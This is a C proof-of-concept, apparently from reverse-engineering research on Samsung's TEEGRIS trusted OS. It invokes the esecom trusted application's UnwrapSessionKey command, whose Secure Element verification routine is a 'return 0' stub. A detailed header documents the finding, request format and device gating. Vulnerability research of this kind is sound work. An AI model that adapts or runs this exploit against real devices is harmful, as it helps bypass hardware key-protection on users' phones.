/*
 * esecom UnwrapSessionKey (cmd 0x20030 / 131120) — unverified session-key
 * unwrap via the ESECOMM_Verify_encapsulate_decapsulate `return 0` stub.
 *
 * FINDING (RE/samsung_teegris/esecom.md follow-up #2, lines 288-304; mirrored
 *   in RE/emulation/esecom.md lines 9-20): the function the RE renamed
 *   `ESECOMM_Verify_encapsulate_decapsulate_STUB` (`sub_BF74` @ 0xBF74) — the
 *   routine that is *supposed* to verify the Secure Element's identity in the
 *   ECDH handshake before a session key is unwrapped — has a body of just
 *   `return 0` (zero instructions besides the RET; esecom.md line 296-298,304).
 *   The SE-side ECDH handshake is entirely ABSENT from the binary, so
 *   `esecom_cmd_UnwrapSessionKey` (@ 0xE744, cmd table esecom.md line 80)
 *   proceeds to the AES-128-GCM unwrap (`sub_AD44` encrypt, `sub_B3D0`/`sub_B06C`
 *   decrypt; esecom.md line 297-298) with NO verification of the SE peer.
 *
 * SEVERITY: HIGH (NEEDS-EXTERNAL-VERIFICATION) — esecom.md line 291,
 *   emulation/esecom.md line 9 + summary table line 96.
 *
 * WIRE (esecom.md lines 50-62):
 *   TA_InvokeCommandEntryPoint (@ 0x84B8) requires
 *     param_types == 0x67 == TEE_PARAM_TYPES(MEMREF_INPUT, MEMREF_INPUT, NONE, NONE).
 *   Both MEMREF buffers must be `tciMessage_t` blobs sized in [0x1018, 0x2030]
 *     (esecom.md line 52-54); any other shape -> -65530 (TEE_ERROR_BAD_FORMAT).
 *   params[0] = request, params[1] = response. Both REE buffers are memcpy'd
 *     into TA-owned globals (unk_1D0E0 / dword_1C0C8) before dispatch — esecom
 *     keeps a TOCTOU-safe shadow copy (esecom.md line 56-59).
 *   The LEADING request word is `cmd_id | 0x80000000`, and is copied back into
 *     params[1] in the response (esecom.md line 62).
 *
 * TRIGGER: open a PUBLIC-login session and invoke cmd 0x20030
 *   (CMD_TZ_ESECOMM_UnwrapSessionKey; esecom.md line 80). params[0] carries the
 *   leading word 0x80020030 followed by the wrapped session-key SO that the stub
 *   "verifies" (waves through). The wrapped-key body the unwrap path consumes is
 *   a 48-byte blob: `unwrapSkeySo_v2` (@ 0xFC08) enforces an output size of
 *   exactly 48 (`v9 == 48` gate; esecom.md line 279-281) and WrapSessionKey
 *   carries the matching "48-byte size sentinel" (esecom.md line 251). The blob
 *   CONTENT is irrelevant to demonstrating the missing verification — the point
 *   is that the verify the SE handshake should impose is the `return 0` stub, so
 *   ANY blob is accepted with no SE authentication.
 *
 * GATE / REPRO-STATUS: DEVICE-ONLY / BLOCKED — the stub itself is
 *   CONFIRMED-IN-BINARY (a `return 0` body is a static property; reading it IS
 *   the confirmation — emulation/esecom.md lines 82-90,96). Its CONSEQUENCE (a
 *   zero-verification unwrap) cannot be driven in the emulator: cmd 0x20030 sits
 *   behind TWO un-modeled mechanisms (emulation/esecom.md lines 61-96):
 *     (1) the eng-build ICCC gate `esecom_is_eng_build` (@ 0x9D84) — requires
 *         (IMAGE_STATUS_BL & 6)==4 && (IMAGE_STATUS_BOOT & 6)==4 read via the
 *         un-modeled ICCC peer (esecom.md lines 80,89-92);
 *     (2) the `/dev/sec_ese` SPI eSE driver-client reached through secEseSelect
 *         -> spiOpen (esecom.md lines 306-321) — un-modeled kernel driver.
 *   On retail builds the path is silently unreachable unless the eng-build ICCC
 *   bits are spoofed via the out-of-corpus QSEE `tz_iccc` SVB-clear of type
 *   0xFF200001 (esecom.md line 220, emulation/esecom.md line 80) — itself
 *   NOT REPRODUCIBLE here. So when this PoC is run against the emulator the
 *   invoke is EXPECTED to be rejected at the dev-status/eng-build gate (the
 *   warranty/SVB ICCC reads return failure -> 9, esecom.md lines 99-107) long
 *   before the stub matters; on an eng-fused device with the eSE driver present
 *   it reaches the stubbed verify. The static finding stands either way.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337"); system("ipcrm -M 0x13338");
    system("ipcrm -M 0x13339"); system("ipcrm -M 0x1333a");
#endif
}

/* esecom command id and the tciMessage framing (esecom.md lines 50-62,80). */
#define CMD_TZ_ESECOMM_UnwrapSessionKey  0x20030u            /* esecom.md line 80 */
#define ESECOMM_REQ_TAG  (CMD_TZ_ESECOMM_UnwrapSessionKey | 0x80000000u) /* leading word, esecom.md line 62 */
#define TCI_MSG_SIZE     0x1018                                /* min of [0x1018,0x2030], esecom.md line 53 */
#define WRAPPED_SKEY_LEN 48                                    /* unwrapSkeySo_v2 `==48` gate, esecom.md lines 279-281,251 */

int main(void)
{
    char* ta = "00000000-0000-0000-0000-657365636f6d";   /* esecom (esecom.md line 3) */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }

    /* PUBLIC login — esecom's TA_OpenSessionEntryPoint is a trivial banner with
     * no per-session credential check (esecom.md line 47). */
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1);
    }
    printf("[*] session opened to esecom with TEEC_LOGIN_PUBLIC (no creds)\n");

    /* Two tciMessage_t buffers: params[0]=request, params[1]=response.
     * Both sized 0x1018 (the documented minimum) to pass the shape gate. */
    uint8_t* req = (uint8_t*)allocate_param_mem(&context, TCI_MSG_SIZE);
    uint8_t* rsp = (uint8_t*)allocate_param_mem(&context, TCI_MSG_SIZE);
    if (!req || !rsp) { printf("[*] alloc failed\n"); exit(-1); }

    /* Leading word = cmd_id | 0x80000000 (esecom.md line 62). */
    *(uint32_t*)req = ESECOMM_REQ_TAG;

    /* The wrapped session-key SO the stub "verifies": a 48-byte blob placed
     * right after the leading word. Its content is irrelevant to the missing-
     * verification finding (the ECDH SE-identity check is the `return 0` stub),
     * so use a recognisable pattern. Offset = +4 follows the leading-word
     * convention; the only writeup-grounded size constraint is the 48-byte
     * sentinel (esecom.md lines 279-281,251). */
    memset(req + 4, 0x41, WRAPPED_SKEY_LEN);
    memset(rsp, 0, TCI_MSG_SIZE);

    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_INPUT,
                                     TEEC_NONE, TEEC_NONE);              /* == 0x67, esecom.md line 50 */
    op.params[0].tmpref.buffer = req; op.params[0].tmpref.size = TCI_MSG_SIZE;
    op.params[1].tmpref.buffer = rsp; op.params[1].tmpref.size = TCI_MSG_SIZE;

    printf("[*] invoking cmd 0x%x (CMD_TZ_ESECOMM_UnwrapSessionKey), ptypes=0x67, "
           "req tag=0x%08x, 48-byte wrapped-key body\n",
           CMD_TZ_ESECOMM_UnwrapSessionKey, ESECOMM_REQ_TAG);
    res = TEEC_InvokeCommand_impl(&session, CMD_TZ_ESECOMM_UnwrapSessionKey, &op, &err_origin);
    printf("[*] UnwrapSessionKey returned 0x%x (%d) origin 0x%x\n",
           res, (int)res, err_origin);

    /* Response carries `cmd_id | 0x80000000` back in its leading word
     * (esecom.md line 62) when the handler runs; on a gated build the invoke is
     * rejected upstream (dev-status/eng-build ICCC -> 9; esecom.md lines 80,99-107). */
    printf("[*] response leading word = 0x%08x (expect 0x%08x if handler ran)\n",
           *(uint32_t*)rsp, ESECOMM_REQ_TAG);

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
